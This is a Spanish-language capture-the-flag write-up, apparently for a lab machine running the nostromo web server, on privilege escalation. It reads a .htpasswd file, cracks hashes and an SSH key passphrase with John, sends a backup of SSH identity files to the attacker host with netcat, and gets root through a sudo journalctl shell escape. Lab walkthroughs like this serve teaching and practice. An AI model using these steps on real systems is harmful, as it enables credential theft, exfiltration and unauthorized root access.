## Escalada de privilegios {-}

### Enumeracion del usuario en la maquina victima {-}

```bash
cd /home
#Output
david

ls /home/david
#Output
Permisson denied

ls -l /home
#Output
drwx--x--x
```

Enumeramos el systema

```bash
cd /
id
sudo -l
find \-perm -4000 2>/dev/null
cd /var
ls
cd nostromo
cd conf
cat nhttpd.conf
cat /var/nostromo/conf/.htpasswd
```

Encontramos el hash del usuario david vamos a copiarlo en la maquina de atacante, y intentamos bruteforcear con **John**

### John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Encontramos una contraseña intentamos ponerla haciendo un `su david` y `su root`, pero no va. La conclusion a la que hay que llegar
es que cuando miras el fichero nhttpd.conf, dice que hay un directorio **public_www**.


### Investigacion del public_www {-}

Intentamos ver si esta en el directorio `/home/david/public_www` y efectivamente. hay un fichero comprimido y nos vamos a transferir 
a nuestro equipo de atacante.

1. En el equipo de atacante

    ```bash
    nc -nlvp 443 > comprimido.tgz
    ```

1. En el equipo victima

    ```bash
    nc 10.10.14.20 443 < backup-ssh-identity-files.tgz
    ```

Descomprimimos el archivo con el comando

```bash
7z l comprimido.tgz
7z x comprimido.tgz
7z l comprimido.tar
7z x comprimido.tar 
```

Hay la clave privado del usuario david pero esta protegida por contraseña. La tenemos que romper.

### ssh2john {-}

```bash
ssh2john.py id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

La contraseña de la id_rsa a sido crackeada y ya nos podemos conectar con ssh

```bash
ssh -i id_rsa david@10.10.10.165 
```

### Escalada de privilegio para root {-}

```bash
ls -l
#Output
bin

cd bin/
cat server-stats.sh
```

Vemos en este fichero que sudo puede ejecutar **journalctl**

Vamos a la pagina de [gtfobins](gtfobins.github.io) y buscamos por jounalctl

El **gtfobins** dice que hay que lanzar jounalctl con sudo y en otra linea poner `!/bin/sh`

> [!] NOTA: cuando pone ! en otra linea quiere decir que hay que ejecutarlo en modo less. O sea hay que reducir la terminal para que se pueda introducir un nuevo commando. En este caso !/bin/sh

Ya estamos root y seguimos mas hack que nunca.
